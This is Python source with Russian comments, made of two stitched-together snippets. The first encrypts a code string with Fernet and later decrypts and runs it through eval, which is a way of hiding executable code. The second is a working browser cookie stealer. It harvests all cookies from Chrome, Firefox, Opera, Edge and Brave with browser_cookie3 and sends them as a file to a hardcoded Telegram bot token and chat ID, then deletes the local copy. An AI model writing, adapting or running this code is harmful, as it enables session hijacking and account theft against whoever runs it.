import cryptography
from cryptography.fernet import Fernet

# 1. Сгенерировать ключ и зашифровать код (в онлайн IDE)
key = Fernet.generate_key()
f = Fernet(key)
# Зашифрованный код в строке
encrypted_code_str = f.encrypt(b"print('Hello, world!')")
# Зашифрованный код в байтах
encrypted_code_bytes = f.encrypt(b"print('Hello, world!')") 

# 2. Дешифровка и выполнение (в другом месте или после перезапуска IDE)
f_dec = Fernet(key)
# Дешифровка строки
decrypted_code_str = f_dec.decrypt(encrypted_code_str).decode()
# Дешифровка байтов
decrypted_code_bytes = f_dec.decrypt(encrypted_code_bytes).decode()

# Выполнение дешифрованного кода (опасность использования eval)
eval(decrypted_code_str) #  eval('print("Hello, world!")')import os
import sqlite3
import shutil
import browser_cookie3  # pip install browser_cookie3
import telegram
from telegram.ext import Updater, CommandHandler

# Замените на свой токен бота
TOKEN = "7734655175:AAFt0xlFYgBZqOMQ5RCOiHHudYy2KTH7GuE"
# Замените на ID вашего чата (куда бот должен отправлять куки)
CHAT_ID = "7429334629"

# Поддерживаемые браузеры (browser_cookie3 может поддерживать и другие)
BROWSERS = ["chrome", "firefox", "opera", "edge", "brave"]

def get_cookies_from_browsers():
    """
    Собирает куки из поддерживаемых браузеров и сохраняет их в текстовый файл.
    Возвращает имя файла с куками.
    """
    cookie_file = "cookies.txt"
    try:
        with open(cookie_file, "w", encoding="utf-8") as f:
            for browser_name in BROWSERS:
                try:
                    cj = browser_cookie3.load(browser_name=browser_name)
                    f.write(f"--- Cookies from {browser_name.capitalize()} ---\n")
                    for cookie in cj:
                        f.write(f"{cookie.domain}\t{cookie.httponly}\t{cookie.path}\t{cookie.secure}\t{cookie.expires}\t{cookie.name}\t{cookie.value}\n")
                    f.write("\n")
                except browser_cookie3.BrowserNotInstalled:
                    print(f"Браузер {browser_name} не установлен.")
                except Exception as e:
                    print(f"Ошибка при получении куки из {browser_name}: {e}")
        return cookie_file
    except Exception as e:
        print(f"Ошибка при записи в файл {cookie_file}: {e}")
        return None

def send_cookies_to_bot(context):
    """
    Получает куки из браузеров и отправляет их в Telegram-бот.
    """
    cookie_file = get_cookies_from_browsers()
    if cookie_file:
        try:
            bot = telegram.Bot(TOKEN)
            with open(cookie_file, "rb") as f:
                bot.send_document(chat_id=CHAT_ID, document=f, filename="cookies.txt")
            os.remove(cookie_file) # Удаляем файл после отправки
            print("Куки успешно отправлены в Telegram!")
        except Exception as e:
            print(f"Ошибка при отправке куки в Telegram: {e}")
    else:
        print("Не удалось получить куки.")


def start(update, context):
    update.message.reply_text("Бот запущен. Куки будут собраны и отправлены.")
    send_cookies_to_bot(context)  # Сразу отправляем куки после /start

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))

    # Отправляем куки сразу при запуске бота (можно закомментировать, если не нужно)
    # updater.job_queue.run_once(send_cookies_to_bot, 0)

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()